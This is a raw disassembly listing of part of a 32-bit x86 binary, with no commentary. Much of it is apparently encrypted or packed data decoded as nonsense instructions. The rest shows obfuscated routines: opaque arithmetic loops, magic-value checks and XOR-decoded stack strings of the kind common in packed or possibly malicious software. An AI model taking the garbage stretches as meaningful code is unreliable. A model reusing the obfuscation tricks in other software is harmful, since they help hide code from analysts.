  41c87a:	and    ecx,ebx
  41c87c:	shl    dh,0xf9
  41c87f:	out    0xa7,al
  41c881:	mov    edi,ecx
  41c883:	cmc    
  41c884:	push   edi
  41c885:	lods   al,BYTE PTR ds:[esi]
  41c886:	pop    eax
  41c887:	sub    ah,BYTE PTR [ecx+0x5a0ebfaf]
  41c88d:	jmp    0x7424:0xd84e0fa5
  41c894:	ja     0x41c8f8
  41c896:	mov    esp,eax
  41c898:	cmp    ebp,DWORD PTR [edx]
  41c89a:	in     al,0xcc
  41c89c:	jmp    0x1296:0xfb104ae2
  41c8a3:	and    al,0x92
  41c8a5:	out    0xe0,eax
  41c8a7:	call   0x283c:0x95d9dccd
  41c8ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8af:	adc    DWORD PTR [ecx-0x6b],esi
  41c8b2:	and    esp,DWORD PTR ds:0x71f4a0d7
  41c8b8:	popf   
  41c8b9:	fistp  QWORD PTR [esi-0x78bd8b2]
  41c8bf:	ficomp WORD PTR [edi+0x5b4a7c03]
  41c8c5:	mov    edx,0x1d668257
  41c8ca:	mov    DWORD PTR [edx+ecx*2],ebx
  41c8cd:	pop    edi
  41c8ce:	leave  
  41c8cf:	xor    BYTE PTR [edi+edi*8+0x5],dl
  41c8d3:	push   esi
  41c8d4:	and    al,0xac
  41c8d6:	mov    dh,0x36
  41c8d8:	mov    dh,0x9
  41c8da:	xchg   ebp,eax
  41c8db:	pop    ebp
  41c8dc:	xchg   BYTE PTR [eax+0x3c],bh
  41c8df:	mov    ch,0x37
  41c8e1:	pop    edi
  41c8e2:	mov    edx,0x4fa23323
  41c8e7:	pop    edx
  41c8e8:	jbe    0x41c893
  41c8ea:	mov    cl,0xbe
  41c8ec:	jae    0x41c91d
  41c8ee:	add    BYTE PTR [edx-0x1c9deb9c],0xc9
  41c8f5:	cmp    al,0x18
  41c8f7:	xchg   edx,eax
  41c8f8:	pop    ds
  41c8f9:	repz out dx,eax
  41c8fb:	mov    eax,ds:0xbbab4f6f
  41c900:	shl    DWORD PTR [ebx-0x27f7efe5],cl
  41c906:	aaa    
  41c907:	inc    edi
  41c908:	arpl   bp,ax
  41c90a:	xchg   esp,eax
  41c90b:	mov    eax,ds:0xd1d2d4b1
  41c910:	mov    ebp,0xa9448c84
  41c915:	into   
  41c916:	lock test al,0xd
  41c919:	into   
  41c91a:	imul   edi,esi,0xffffffff
  41c91d:	pushf  
  41c91e:	and    ebp,DWORD PTR [ebp-0x73b3e7]
  41c924:	(bad)  
  41c925:	in     eax,0x5f
  41c927:	mov    ds:0x3ed76b8a,al
  41c92c:	cmp    eax,DWORD PTR [ecx+0x30]
  41c92f:	(bad)  
  41c930:	sti    
  41c931:	xlat   BYTE PTR ds:[ebx]
  41c932:	test   eax,0x737f873c
  41c937:	sbb    al,0x80
  41c939:	mov    ds:0xbd758dfd,al
  41c93e:	div    BYTE PTR [edi+0x71]
  41c941:	add    ebp,edx
  41c943:	loope  0x41c960
  41c945:	dec    eax
  41c946:	je     0x41c93e
  41c948:	mov    dl,0x36
  41c94a:	jle    0x41c966
  41c94c:	shr    BYTE PTR [ebp-0x3c8cbf09],0x49
  41c953:	xchg   esi,eax
  41c954:	in     eax,dx
  41c955:	mov    al,0xdc
  41c957:	jmp    0x45a5:0xb15904e9
  41c95e:	sub    eax,0x99460a81
  41c963:	rol    BYTE PTR [ebx],0xa1
  41c966:	mov    ah,0xe0
  41c968:	aaa    
  41c969:	sub    al,0x3c
  41c96b:	ins    BYTE PTR es:[edi],dx
  41c96c:	cli    
  41c96d:	sbb    esp,edi
  41c96f:	inc    ecx
  41c970:	ins    BYTE PTR es:[edi],dx
  41c971:	push   ebp
  41c972:	call   0x2175fce0
  41c977:	(bad)  
  41c978:	mov    bl,0x25
  41c97a:	into   
  41c97b:	dec    ebx
  41c97c:	jo     0x41c9ed
  41c97e:	ja     0x41c96d
  41c980:	sub    bl,BYTE PTR [esi+0x78a026b7]
  41c986:	push   ds
  41c987:	adc    DWORD PTR [edx+0x31963d61],ebp
  41c98d:	cdq    
  41c98e:	scas   eax,DWORD PTR es:[edi]
  41c98f:	ins    DWORD PTR es:[edi],dx
  41c990:	pop    ecx
  41c991:	sub    edi,DWORD PTR [esi]
  41c993:	(bad)  [eax]
  41c995:	and    dl,BYTE PTR [esi]
  41c997:	adc    bl,cl
  41c999:	(bad)  
  41c99a:	cmp    eax,0xaa5affa0
  41c99f:	push   esi
  41c9a0:	pop    ds
  41c9a1:	std    
  41c9a2:	(bad)  
  41c9a3:	std    
  41c9a4:	fidiv  WORD PTR [esi]
  41c9a6:	ds inc esi
  41c9a8:	std    
  41c9a9:	adc    BYTE PTR [esi+0x37],dh
  41c9ac:	push   ds
  41c9ad:	std    
  41c9ae:	retf   
  41c9af:	cmp    al,0x93
  41c9b1:	call   0x25a0c62e
  41c9b6:	adc    al,BYTE PTR [edx+0x17]
  41c9b9:	xchg   ecx,eax
  41c9ba:	dec    eax
  41c9bb:	fcmovb st,st(2)
  41c9bd:	fisub  DWORD PTR [ecx-0x26be8737]
  41c9c3:	daa    
  41c9c4:	mov    dl,0x61
  41c9c6:	sub    eax,0xb33f69e4
  41c9cb:	or     eax,0xc6f7e259
  41c9d0:	iret   
  41c9d1:	ror    ebp,1
  41c9d3:	je     0x41c9fa
  41c9d5:	push   0x8e9696a2
  41c9da:	xor    esi,ebp
  41c9dc:	sbb    ah,BYTE PTR [ecx+0x366ab7bb]
  41c9e2:	popa   
  41c9e3:	mov    bh,0xfd
  41c9e5:	sub    ebx,ebp
  41c9e7:	cmc    
  41c9e8:	add    ah,BYTE PTR [eax+0x65]
  41c9eb:	jecxz  0x41c9e0
  41c9ed:	jns    0x41c999
  41c9ef:	cmp    WORD PTR [edx-0x4401460],bx
  41c9f6:	pop    edx
  41c9f7:	mov    ebp,DWORD PTR [edi]
  41c9f9:	js     0x41ca04
  41c9fb:	outs   dx,BYTE PTR ds:[esi]
  41c9fc:	(bad)  
  41c9fd:	jp     0x41ca38
  41c9ff:	push   es
  41ca00:	js     0x41c9bc
  41ca02:	(bad)  
  41ca03:	fst    QWORD PTR [ebx+0x74]
  41ca06:	retf   0xe248
  41ca09:	ja     0x41ca6b
  41ca0b:	pop    esi
  41ca0c:	and    eax,0x3ac44620
  41ca11:	out    dx,al
  41ca12:	jl     0x41ca17
  41ca14:	mov    ds:0xc393f8fa,al
  41ca19:	das    
  41ca1a:	cmc    
  41ca1b:	fs push 0x46
  41ca1e:	jg     0x41c9ad
  41ca20:	scas   eax,DWORD PTR es:[edi]
  41ca21:	pushf  
  41ca22:	mov    BYTE PTR [ebp+0x38],bl
  41ca25:	mov    ecx,0x1319dd66
  41ca2a:	loope  0x41ca11
  41ca2c:	mov    ds:0x8de08610,al
  41ca31:	je     0x41c9f3
  41ca33:	mov    ebx,0xb61169c2
  41ca38:	mov    edx,0x47636c1e
  41ca3d:	(bad)  
  41ca3f:	xchg   BYTE PTR [esi-0x77bce087],bl
  41ca45:	push   0x2becb621
  41ca4a:	mov    esp,0x9639833e
  41ca4f:	jl     0x41cacb
  41ca51:	in     eax,dx
  41ca52:	push   cs
  41ca53:	pusha  
  41ca54:	int    0x6e
  41ca56:	ret    
  41ca57:	and    eax,0xda0fdd72
  41ca5c:	mov    ds:0xa3035350,eax
  41ca61:	jmp    0x41ca83
  41ca63:	std    
  41ca64:	push   edx
  41ca65:	inc    ebx
  41ca66:	sub    BYTE PTR [ecx+ebp*1+0x6fdabab6],cl
  41ca6d:	lods   al,BYTE PTR ds:[esi]
  41ca6e:	cmp    BYTE PTR [ecx-0x53],al
  41ca71:	aas    
  41ca72:	inc    eax
  41ca73:	imul   dh
  41ca75:	bswap  ebx
  41ca77:	pusha  
  41ca78:	mov    cl,0x1b
  41ca7a:	and    al,0xf1
  41ca7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca7d:	fwait
  41ca7e:	jnp    0x41caa4
  41ca80:	fs cdq 
  41ca82:	sub    al,0x78
  41ca84:	outs   dx,DWORD PTR ds:[esi]
  41ca85:	into   
  41ca86:	jb     0x41ca26
  41ca88:	mov    ch,0x80
  41ca8a:	sbb    DWORD PTR [eiz*4+0x6676c10b],esi
  41ca91:	mov    ebx,0xec1921a2
  41ca96:	adc    eax,0x5e22302
  41ca9b:	mov    cl,0xfd
  41ca9d:	mov    al,ds:0x79a3b329
  41caa2:	sahf   
  41caa3:	loop   0x41cb23
  41caa5:	fs sub al,0x2e
  41caa8:	push   edx
  41caa9:	std    
  41caaa:	jg     0x41cacb
  41caac:	inc    ecx
  41caad:	mov    bh,BYTE PTR [eax-0xbe9949c]
  41cab3:	stc    
  41cab4:	jg     0x41cb05
  41cab6:	mov    dl,0xb6
  41cab8:	mov    edi,0xff7caa18
  41cabd:	push   ecx
  41cabe:	cdq    
  41cabf:	in     al,0xe4
  41cac1:	push   esi
  41cac2:	mov    ds:0x6be7eb5d,al
  41cac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cac8:	test   BYTE PTR [ebp+ecx*1-0x10179465],bl
  41cacf:	jg     0x41cab9
  41cad1:	les    ebp,FWORD PTR [ebx-0x4b64949f]
  41cad7:	xchg   DWORD PTR [ecx+0x46389e4a],ebp
  41cadd:	sbb    DWORD PTR [edx+0xe1619cc],0x904b049f
  41cae7:	jg     0x41ca6e
  41cae9:	mov    ebp,DWORD PTR [edi-0x32]
  41caec:	out    0x83,al
  41caee:	mov    cl,0x74
  41caf0:	and    BYTE PTR [edi],bh
  41caf2:	call   0xb0d8:0x42c8f341
  41caf9:	push   ds
  41cafa:	xor    dh,0xf9
  41cafd:	cmp    al,0x9c
  41caff:	es das 
  41cb01:	mov    es,WORD PTR es:[esp+edi*2]
  41cb05:	mov    ebp,0x806b4c
  41cb0a:	sub    eax,0xa95f4cfc
  41cb0f:	and    eax,0x1cdcdbc4
  41cb14:	push   ds
  41cb15:	or     eax,0x421f8261
  41cb1a:	iret   
  41cb1b:	or     ah,BYTE PTR [edx+0x13]
  41cb1e:	xchg   esp,ebx
  41cb20:	loope  0x41cb12
  41cb22:	pop    edx
  41cb23:	scas   eax,DWORD PTR es:[edi]
  41cb24:	pop    ebp
  41cb25:	xor    eax,0x4f47d3a1
  41cb2a:	cs xor eax,0x62
  41cb2e:	aad    0x45
  41cb30:	adc    cl,BYTE PTR [ecx-0x641fd71f]
  41cb36:	stc    
  41cb37:	xchg   ebx,eax
  41cb38:	mov    bl,0x7
  41cb3a:	int3   
  41cb3b:	xchg   edi,eax
  41cb3c:	test   al,0xbf
  41cb3e:	or     eax,0x4ab666d8
  41cb43:	js     0x41cb7e
  41cb45:	mov    ds:0x44b832f7,al
  41cb4a:	xor    eax,0xbe5af7b0
  41cb4f:	cmp    eax,0xb5c8d823
  41cb54:	inc    eax
  41cb55:	das    
  41cb56:	cmp    bh,BYTE PTR [ecx-0x30c31f18]
  41cb5c:	jns    0x41cbcb
  41cb5e:	cdq    
  41cb5f:	(bad)  
  41cb60:	push   0xffffffc2
  41cb62:	and    edx,ebx
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	cmp    ebp,esi
  41ce46:	fdivr  DWORD PTR [edi]
  41ce48:	push   0x34
  41ce4a:	fimul  WORD PTR [esi-0x7b]
  41ce4d:	push   ebx
  41ce4e:	shr    ecx,0x2f
  41ce51:	pop    ebx
  41ce52:	jl     0x41ceb6
  41ce54:	add    DWORD PTR [eax],eax
  41ce56:	add    BYTE PTR [eax],al
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
